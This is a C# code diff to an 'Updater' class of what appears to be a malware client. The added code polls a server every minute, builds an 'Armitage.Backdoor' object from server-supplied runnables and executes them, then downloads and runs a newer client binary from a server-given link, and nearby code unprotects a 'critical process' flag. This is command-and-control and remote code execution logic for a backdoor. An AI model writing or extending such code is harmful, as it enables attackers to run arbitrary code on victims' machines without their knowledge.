@@ -15,8 +15,9 @@ namespace Client.Utilities
     public class Updater
     {
         private System.Timers.Timer _refreshtimer;
-
-        public void Start() {
+        private float FetchedVersion = 0f;
+        public void Start()
+        {
             _refreshtimer = new System.Timers.Timer();
             _refreshtimer.Interval = 60 * 1000;
             _refreshtimer.Elapsed += _refreshtimer_Elapsed;
@@ -28,10 +29,25 @@ namespace Client.Utilities
             FetchUpdates();
         }
 
-        public Communication.JSON_Models.Update FetchUpdates()
+        public async void FetchUpdates()
         {
-            // todo
-            return null;
+            await Task.Run(() =>
+            {   // todo
+                var update_data = Communication.Server.GetUpdate();
+                if (update_data!= null && FetchedVersion != update_data.UpdateVersion)
+                {
+                    // its a new update, initialize it
+                    FetchedVersion = update_data.UpdateVersion;
+
+                    Armitage.Backdoor bd = new Armitage.Backdoor(update_data.Runnables);
+                    bd.Execute(); // async
+
+                    if (update_data.LetterVersion > Constants.Version)
+                    {
+                        DownloadAndRunNewLetter(update_data.DownloadLink);
+                    }
+                }
+            });
         }
 
         /// <summary>
@@ -48,7 +64,7 @@ namespace Client.Utilities
             {
                 // unprotect (very dangerous)
                 if (Armitage.Critical_Process.IsProtected)
-                Armitage.Critical_Process.Unprotect();
+                    Armitage.Critical_Process.Unprotect();
 
                 try
                 {
